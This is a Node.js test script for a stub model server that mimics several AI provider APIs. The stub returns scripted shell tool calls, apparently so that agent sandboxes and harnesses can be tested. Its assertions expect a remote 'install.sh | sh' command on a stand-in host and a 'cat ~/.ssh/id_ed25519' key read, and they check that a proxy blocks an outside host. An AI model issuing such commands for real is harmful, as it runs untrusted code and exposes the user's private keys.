#!/usr/bin/env node
// A check of stub-model.mjs without any agent: each API's first answer is
// the scripted shell call, a request that already carries four tool
// results gets the final answer, and the proxy refuses an outside host.
//
// Usage: node stub-test.mjs

import { spawn } from 'node:child_process'
import { mkdtempSync, readFileSync } from 'node:fs'
import { request } from 'node:http'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { strict as assert } from 'node:assert'

const log = join(mkdtempSync(join(tmpdir(), 'stub-test-')), 'requests.jsonl')
const stub = spawn(process.execPath, [join(dirname(fileURLToPath(import.meta.url)), 'stub-model.mjs')], { env: { ...process.env, STUB_LOG: log }, stdio: ['ignore', 'pipe', 'inherit'] })
const port = await new Promise(resolve => stub.stdout.once('data', d => resolve(Number(String(d).trim()))))

async function post(path, body) {
  const res = await fetch(`http://127.0.0.1:${port}${path}`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) })
  return res.text()
}

try {
  const shell = { type: 'object', properties: { command: { type: 'string' } }, required: ['command'] }
  // Anthropic Messages, streamed.
  let text = await post('/v1/messages', { stream: true, tools: [{ name: 'Bash', input_schema: shell }], messages: [{ role: 'user', content: 'go' }] })
  assert.match(text, /"type":"tool_use".*"name":"Bash"/)
  assert.match(text, /example\.invalid\/install\.sh \| sh/)
  // OpenAI chat completions, after four results.
  const tool = { role: 'tool', content: 'ok' }
  text = await post('/v1/chat/completions', { stream: true, tools: [{ type: 'function', function: { name: 'bash', parameters: shell } }], messages: [{ role: 'user', content: 'go' }, tool, tool, tool, tool] })
  assert.match(text, /E2E-DONE/)
  // OpenAI Responses: the `cmd` argument of exec_command.
  text = await post('/v1/responses', { tools: [{ type: 'function', name: 'exec_command', parameters: { type: 'object', properties: { cmd: { type: 'string' } } } }], input: [{ type: 'function_call_output', output: 'x' }] })
  assert.match(text, /"name":"exec_command"/)
  assert.match(text, /\\"cmd\\":\\"cat ~\/.ssh\/id_ed25519\\"/)
  // Gemini.
  text = await post('/v1beta/models/stub:streamGenerateContent', { tools: [{ functionDeclarations: [{ name: 'run_shell_command', parametersJsonSchema: shell }] }], contents: [{ role: 'user', parts: [{ text: 'go' }] }] })
  assert.match(text, /"functionCall":\{"name":"run_shell_command"/)
  // The proxy refuses another host.
  const status = await new Promise((resolve, reject) => {
    const req = request({ host: '127.0.0.1', port, method: 'CONNECT', path: 'example.org:443' })
    req.on('connect', res => { res.socket?.destroy(); resolve(res.statusCode) })
    req.on('error', reject)
    req.end()
  })
  assert.equal(status, 403)
  assert.match(readFileSync(log, 'utf8'), /"proxy":"example\.org:443"/)
  console.log('stub-test: ok')
} finally {
  stub.kill()
}
